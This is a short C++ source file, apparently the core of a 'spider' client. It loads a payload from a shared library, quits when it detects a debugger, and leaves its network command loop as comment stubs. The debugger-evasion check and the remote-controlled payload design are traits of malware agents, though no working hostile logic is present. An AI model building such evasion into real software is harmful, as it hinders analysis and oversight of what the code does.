#include <functional>
#include "Core.h"
#include "IPayload.h"
#include "AntiDbg.h"
#include "Logger.hpp"

namespace spider
{
namespace client
{
namespace core
{
Core::Core(std::string const &path) :
#if defined _WIN32
                                      m_lib(path + "foo.dll"),
#elif defined __APPLE__
                                      m_lib(path + "libfoo.dylib"),
#elif defined __linux__
                                      m_lib(path + "libfoo.so"),
#else
#error "Plateform not supported"
#endif
                                      m_payload(nullptr)
{
    std::function<library::IPayload *()> getPayload = m_lib.getFunction<library::IPayload *()>("getPayload");
    m_payload = getPayload();
    if (!m_payload)
    {
        throw std::runtime_error("Invalid payload");
    }
    if (!m_payload->init())
    {
        throw std::runtime_error("Cannot initialize payload");
    }
	nope::log::Log(Info) << "Core correctly loaded.";
}

Core::~Core()
{
    m_payload->deinit();
}

int Core::run()
{
    while (1)
    {
        // Check  Debugger
        if (spider::misc::Debugger::isDebuggerPresent())
        {
            return EXIT_FAILURE;
        }

        // Get requests from network
        // Execute needed action
    }
    return EXIT_SUCCESS;
}
}
}
}